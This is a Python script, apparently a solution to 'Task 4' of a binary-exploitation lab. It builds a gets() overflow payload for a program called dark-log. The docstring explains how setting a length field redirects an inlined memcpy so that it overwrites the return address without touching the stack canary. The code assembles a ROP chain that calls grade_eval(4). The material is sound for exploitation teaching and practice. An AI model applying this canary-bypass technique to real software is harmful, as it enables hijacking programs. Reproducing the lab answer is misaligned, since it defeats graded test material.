#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (stack canary bypass).

dark-log's input() keeps a canary at rbp-8 and a 128-byte expression
buffer at rbp-0x120.  gets() lets us overwrite everything, but the
canary check would abort us - unless we never touch the canary.

The function also performs an inlined 128-byte copy:

    len  = *(int *)(rbp - 0x20);          // 0 before gets()
    dest = (rbp - 0xa0) + len;            // logMsg + len
    memcpy(dest, expression, 128);

len is itself reachable through the gets() overflow (expression is
0x100 bytes below it).  Setting len = 0xa0 moves the destination from
logMsg to rbp, so the 128-byte copy rewrites precisely the saved rbp
and the return address - and nothing else - while the canary at rbp-8
stays untouched.  The input length is therefore 0x104 bytes: 4 bytes of
len plus one NUL terminator, stopping right before the canary.

The copied bytes are the first 128 bytes of our input, i.e. the ROP
chain that calls grade_eval(4) through "pop rdi; ret" (0x4018a3).
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)
p32 = lambda v: struct.pack("<I", v)

POP_RDI = 0x4018A3               # pop rdi ; ret
RET = 0x4018A4                   # ret          (stack alignment)
GRADE_EVAL = 0x401677            # grade_eval()
EXIT_PLT = 0x401580              # exit@plt
LEN_OFF = 0x120 - 0x20           # offset of len from expression
COPY_DST_OFF = 0xA0              # len value that makes dest == rbp

chain = b"C" * 8                 # saved rbp (garbage, never used again)
chain += p64(POP_RDI)
chain += p64(4)                  # edi = 4
chain += p64(RET)                # keep rsp % 16 == 8 at grade_eval
chain += p64(GRADE_EVAL)
chain += p64(EXIT_PLT)

payload = chain.ljust(LEN_OFF, b"D")
payload += p32(COPY_DST_OFF)
payload += b"\x00"               # gets()'s terminator, right before canary

sys.stdout.buffer.write(payload + b"\n")
